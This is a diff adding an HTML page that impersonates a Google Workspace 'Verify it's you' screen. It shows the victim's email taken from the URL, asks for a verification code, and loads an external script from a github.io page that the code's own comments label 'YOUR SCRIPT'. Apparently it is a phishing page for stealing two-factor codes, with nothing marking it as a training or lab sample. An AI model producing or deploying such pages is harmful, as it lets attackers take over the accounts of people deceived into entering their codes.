@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verify Code – Google Workspace</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  background:#f1f3f4;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+}
+
+.container{
+  background:#fff;
+  width:100%;
+  max-width:420px;
+  padding:36px;
+  border-radius:10px;
+  box-shadow:0 4px 10px rgba(0,0,0,0.1);
+}
+
+.logo{
+  text-align:center;
+  margin-bottom:10px;
+}
+
+h2{
+  font-weight:500;
+  margin:5px 0 10px;
+}
+
+p{
+  font-size:14px;
+  color:#5f6368;
+  margin-bottom:15px;
+}
+
+.email{
+  font-size:14px;
+  color:#202124;
+  margin-bottom:20px;
+}
+
+input{
+  width:100%;
+  padding:14px;
+  font-size:16px;
+  border:1px solid #dadce0;
+  border-radius:5px;
+  outline:none;
+}
+
+input:focus{
+  border-color:#1a73e8;
+}
+
+.actions{
+  margin-top:30px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+.btn{
+  padding:10px 22px;
+  font-size:14px;
+  border:none;
+  border-radius:5px;
+  background:#1a73e8;
+  color:#fff;
+  cursor:pointer;
+  opacity:0.5;
+}
+
+.btn.active{
+  opacity:1;
+}
+
+.resend-area{
+  margin-top:18px;
+  font-size:13px;
+  color:#5f6368;
+}
+
+.resend-btn{
+  background:none;
+  border:none;
+  font-size:13px;
+  color:#1a73e8;
+  cursor:pointer;
+}
+
+.resend-btn.disabled{
+  color:#9aa0a6;
+  cursor:default;
+}
+
+.countdown{
+  margin-top:6px;
+  font-size:12px;
+  color:#ea4335;
+}
+</style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="container">
+
+  <div class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTaGYDpJTGbnkGvO-xjuPgzs7H-hzpJH1nAYyKvS9NTk1-MBHZ3iBrZqgwN&s=10" style="width:160px;">
+  </div>
+
+  <h2>Verify it’s you</h2>
+  <p>We sent a verification code to your business email. Enter it below.</p>
+
+  <!-- ✅ REQUIRED FOR YOUR SCRIPT -->
+  <div class="email" id="emailDisplay">help@yourbusiness.com</div>
+
+  <form>
+    <input 
+      type="text" 
+      id="codeInput" 
+      placeholder="Enter verification code"
+      name="VERIFICATION_CODE"
+    >
+
+    <div class="actions">
+      <!-- ✅ REAL SUBMIT BUTTON -->
+      <button type="submit" class="btn" id="verifyBtn">Verify</button>
+    </div>
+
+    <div class="resend-area">
+      Didn’t get a code?
+      <button type="button" class="resend-btn" id="resendBtn">
+        Resend code
+      </button>
+      <div class="countdown" id="countdownText"></div>
+    </div>
+  </form>
+</div>
+
+<script>
+// ==== SHOW EMAIL FROM URL (?email=...) ====
+(function(){
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email") || "";
+  document.getElementById("emailDisplay").textContent = email;
+})();
+
+// ==== VERIFY BUTTON ENABLE/DISABLE ====
+const codeInput = document.getElementById("codeInput");
+const verifyBtn = document.getElementById("verifyBtn");
+
+codeInput.addEventListener("input", () => {
+  const hasValue = codeInput.value.trim().length > 0;
+  if (hasValue){
+    verifyBtn.classList.add("active");
+  } else {
+    verifyBtn.classList.remove("active");
+  }
+});
+
+// ✅ NO BLOCKING — SUBMIT WILL RELOAD THE PAGE
+
+// ==== RESEND CODE WITH INCREASING DELAY ====
+const resendBtn = document.getElementById("resendBtn");
+const countdownText = document.getElementById("countdownText");
+
+let resendCount = 0;
+let timerId = null;
+
+resendBtn.addEventListener("click", () => {
+  resendCount++;
+  const delaySeconds = 30 * resendCount;
+
+  resendBtn.classList.add("disabled");
+
+  let remaining = delaySeconds;
+  countdownText.textContent = `You can resend a new code in ${remaining}s`;
+
+  if (timerId) clearInterval(timerId);
+
+  timerId = setInterval(() => {
+    remaining--;
+    if (remaining > 0){
+      countdownText.textContent = `You can resend a new code in ${remaining}s`;
+    } else {
+      clearInterval(timerId);
+      countdownText.textContent = "";
+      resendBtn.classList.remove("disabled");
+    }
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
